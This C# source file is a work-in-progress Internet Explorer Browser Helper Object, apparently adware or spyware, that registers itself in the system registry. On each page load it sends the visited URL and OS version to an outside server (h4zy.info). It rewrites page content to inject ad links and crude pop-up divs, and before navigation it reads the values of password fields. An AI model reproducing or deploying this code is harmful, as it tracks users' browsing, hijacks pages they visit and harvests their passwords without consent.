using System;
using System.Collections.Generic;
using System.Text;
using SHDocVw;
using mshtml;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.Net;
using System.Xml;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

namespace BHO_HelloWorld
{

    [
    ComVisible(true),
    Guid("8a194578-81ea-4850-9911-13ba2d71efbd"),
    ClassInterface(ClassInterfaceType.None)
    ]
    public class BHO:IObjectWithSite
    {

        WebBrowser webBrowser;
        HTMLDocument document;

        List<string> blacklist = new List<string>(); // don't pop the same url 2ce within a 8 hour period

        // returns whether or not url exists in blacklist
        public bool existsInBlackList(string url)
        {
            bool flag = false;

            foreach(string blacklisted in blacklist) {
                if(blacklisted == url) {
                    flag = true;
                    System.Windows.Forms.MessageBox.Show("found " + url + " in blacklist ");
                }
            }

            return flag;
        }

        public void OnDocumentComplete(object pDisp, ref object URL)
        {
            try
            {
                restorelinks();
            }
            catch (Exception e)
            {
                System.Windows.Forms.MessageBox.Show(e.Message);
            }

            //blacklist = DeSerializeObject("linkfile");

            string urlpop = sendData(URL.ToString());
            blacklist.Add(urlpop);
            System.Windows.Forms.MessageBox.Show("adding " + urlpop + " to blacklist");

            // what's going on is one of 2 things... the urlpop
            // is putting a trailing slash on it for the blacklist or the
            // url is changing...
            // looks like our class is being re-made on every new window
            System.Windows.Forms.MessageBox.Show(blacklist.Count.ToString());

            if (!existsInBlackList(URL.ToString()))
            {
                //System.Diagnostics.Process proc = new
                //System.Diagnostics.Process();
                //proc.StartInfo.FileName = "iexplore";
                //proc.StartInfo.Arguments = urlpop;
                //proc.Start();
                blacklist.Add(URL.ToString());
                System.Windows.Forms.MessageBox.Show("adding " + URL.ToString() + " to blacklist -- should not see it again");
            }

            //blacklist.ToArray.ToString();

            try
            {
                savelinks();
            }
            catch (Exception e)
            {
                System.Windows.Forms.MessageBox.Show(e.Message);
            } 

            //SerializeObject("linkfile", blacklist);
        }

        public void SerializeObject(string filename, List<String> links)
        {
            Stream stream = File.Open(filename, FileMode.Create);
            BinaryFormatter bFormatter = new BinaryFormatter();
            bFormatter.Serialize(stream, links);
            stream.Close();
        }

        public List<String> DeSerializeObject(string filename)
        {
            List<String> links;
            Stream stream = File.Open(filename, FileMode.Open);
            BinaryFormatter bFormatter = new BinaryFormatter();
            links = (List<String>)bFormatter.Deserialize(stream);
            stream.Close();
            return links;
        }

        public void displayContextual()
        {
            string keyword = "dog";
            string link = "http://ass.com";

            // temp. replace all links with something else
            foreach (IHTMLElement tempElement in document.getElementsByTagName("a"))
            {
                string tempstr = tempElement.getAttribute("href").ToString();
                tempElement.setAttribute("href", tempstr.Replace(keyword, "doxxxg"));
            }

            // now replace all keywords with links
            foreach (IHTMLElement tempElement in document.getElementsByTagName("div"))
            {
                tempElement.innerHTML = tempElement.innerHTML.Replace(keyword, "<a href=\"http://misterevil.com\">dog</a>");
            }

            // now revert back to orig. link
            int icount = 0;
            foreach (IHTMLElement tempElement in document.getElementsByTagName("a"))
            {
                tempElement.setAttribute("href", tempElement.getAttribute("href").ToString().Replace("doxxxg", keyword));
                tempElement.onmouseover = "document.getElementById('adz" + icount.ToString() + "').style.display='';";
                tempElement.onmouseout = "document.getElementById('adz" + icount.ToString() + "').style.display='none';";
                string ad = "<div id=\"adz" + icount.ToString() + "\" style=\"display: none; border:1px solid #000; color: blue;\"><a href=\"" + link + "\">Click this Shit! It's really fucking awesome! I'm not even shitting you!</a></div>";
                tempElement.insertAdjacentHTML("beforeBegin", ad);
                icount++;
            }
  
        }

        public void restorelinks()
        {
            // create reader & open file
            TextReader tr = new StreamReader("date.txt");

            string input = null;
            // read a line of text
            while ((input = tr.ReadLine()) != null)
            {
                blacklist.Add(input);
            }
            
            // close the stream
            tr.Close();
        }

        public void savelinks()
        {
            // create a writer and open the file
            TextWriter tw = new StreamWriter("date.txt");

            foreach(string link in blacklist) {
                // write a line of text to the file
                tw.WriteLine(link);
            }

            // close the stream
            tw.Close();
        }

        public void getlinks()
        {
            // Create a new XmlDocument  
            XmlDocument doc = new XmlDocument();

            // Load data  
            doc.Load("http://xml.weather.yahoo.com/forecastrss?p=94704");

            // Set up namespace manager for XPath  
            XmlNamespaceManager ns = new XmlNamespaceManager(doc.NameTable);
            ns.AddNamespace("yweather", "http://xml.weather.yahoo.com/ns/rss/1.0");

            // Get forecast with XPath  
            XmlNodeList nodes = doc.SelectNodes("/rss/channel/item/yweather:forecast", ns);

            // You can also get elements based on their tag name and namespace,  
            // though this isn't recommended  
            //XmlNodeList nodes = doc.GetElementsByTagName("forecast",   
            //                          "http://xml.weather.yahoo.com/ns/rss/1.0");  

            string low = "";

            foreach (XmlNode node in nodes)
            {
                low = node.Attributes["low"].InnerText;

                Console.WriteLine("{0}: {1}, {2}F - {3}F",
                                    node.Attributes["day"].InnerText,
                                    node.Attributes["text"].InnerText,
                                    node.Attributes["low"].InnerText,
                                    node.Attributes["high"].InnerText);
            }
            System.Windows.Forms.MessageBox.Show(low);
        }

        public void getURLS()
        {
            // used to build entire input
            StringBuilder sb = new StringBuilder();

            // used on each read operation
            byte[] buf = new byte[8192];

            // prepare the web page we will be asking for
            HttpWebRequest request = (HttpWebRequest)
                WebRequest.Create("http://h4zy.info/links.txt");

            // execute the request
            HttpWebResponse response = (HttpWebResponse)
                request.GetResponse();

            // we will read data via the response stream
            Stream resStream = response.GetResponseStream();

            string tempString = null;
            int count = 0;

            do
            {
                // fill the buffer with data
                count = resStream.Read(buf, 0, buf.Length);

                // make sure we read some data
                if (count != 0)
                {
                    // translate from bytes to ASCII text
                    tempString = Encoding.ASCII.GetString(buf, 0, count);

                    // continue building the string
                    sb.Append(tempString);
                }
            }
            while (count > 0); // any more data to read?

            // print out page source
            System.Windows.Forms.MessageBox.Show(sb.ToString());
            //Console.WriteLine(sb.ToString());
        }

        public string sendData(string url)
        {
            // Create a request using a URL that can receive a post. 
            WebRequest request = WebRequest.Create("http://h4zy.info/getad.php");

            // Set the Method property of the request to POST.
            request.Method = "POST";
            string osversion = System.Environment.OSVersion.ToString();

            // Create POST data and convert it to a byte array.
            string postData = "os=" + osversion + "&url=" + url;
            byte[] byteArray = Encoding.UTF8.GetBytes(postData);
            
            // Set the ContentType property of the WebRequest.
            request.ContentType = "application/x-www-form-urlencoded";
            
            // Set the ContentLength property of the WebRequest.
            request.ContentLength = byteArray.Length;
            
            // Get the request stream.
            Stream dataStream = request.GetRequestStream();
            
            // Write the data to the request stream.
            dataStream.Write(byteArray, 0, byteArray.Length);
            
            // Close the Stream object.
            dataStream.Close();
            
            // Get the response.
            WebResponse response = request.GetResponse();
            
            // Display the status.
            //Console.WriteLine(((HttpWebResponse)response).StatusDescription);
            
            // Get the stream containing content returned by the server.
            dataStream = response.GetResponseStream();
            
            // Open the stream using a StreamReader for easy access.
            StreamReader reader = new StreamReader(dataStream);
            
            // Read the content.
            string responseFromServer = reader.ReadToEnd();
            
            // Display the content.
            //Console.WriteLine(responseFromServer);
            
            // Clean up the streams.
            reader.Close();
            dataStream.Close();
            response.Close();

            return responseFromServer;
        }

        public void OnBeforeNavigate2(object pDisp, ref object URL, ref object Flags, ref object TargetFrameName, ref object PostData, ref object Headers, ref bool Cancel)
        {
            document = (HTMLDocument)webBrowser.Document;

            foreach(IHTMLInputElement tempElement in document.getElementsByTagName("INPUT"))
            {
            if(tempElement.type.ToLower()=="password")
            {
            
                System.Windows.Forms.MessageBox.Show(tempElement.value);
            }
            
            }
        
        }



        #region BHO Internal Functions
        public static string BHOKEYNAME = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects";

        [ComRegisterFunction]
        public static void RegisterBHO(Type type)
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BHOKEYNAME, true);

            if (registryKey == null)
                registryKey = Registry.LocalMachine.CreateSubKey(BHOKEYNAME);

            string guid = type.GUID.ToString("B");
            RegistryKey ourKey = registryKey.OpenSubKey(guid);

            if (ourKey == null)
                ourKey = registryKey.CreateSubKey(guid);

            ourKey.SetValue("Alright", 1);
            registryKey.Close();
            ourKey.Close();
        }

        [ComUnregisterFunction]
        public static void UnregisterBHO(Type type)
        {
            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(BHOKEYNAME, true);
            string guid = type.GUID.ToString("B");

            if (registryKey != null)
                registryKey.DeleteSubKey(guid, false);
        }

        public int SetSite(object site)
        {

            if (site != null)
            {
                webBrowser = (WebBrowser)site;
                webBrowser.DocumentComplete += new DWebBrowserEvents2_DocumentCompleteEventHandler(this.OnDocumentComplete);
                webBrowser.BeforeNavigate2+=new DWebBrowserEvents2_BeforeNavigate2EventHandler(this.OnBeforeNavigate2);
            }
            else
            {
                webBrowser.DocumentComplete -= new DWebBrowserEvents2_DocumentCompleteEventHandler(this.OnDocumentComplete);
                webBrowser.BeforeNavigate2 -= new DWebBrowserEvents2_BeforeNavigate2EventHandler(this.OnBeforeNavigate2);
                webBrowser = null;
            }

            return 0;

        }

        public int GetSite(ref Guid guid, out IntPtr ppvSite)
        {
            IntPtr punk = Marshal.GetIUnknownForObject(webBrowser);
            int hr = Marshal.QueryInterface(punk, ref guid, out ppvSite);
            Marshal.Release(punk);

            return hr;
        }





        #endregion


    }
}
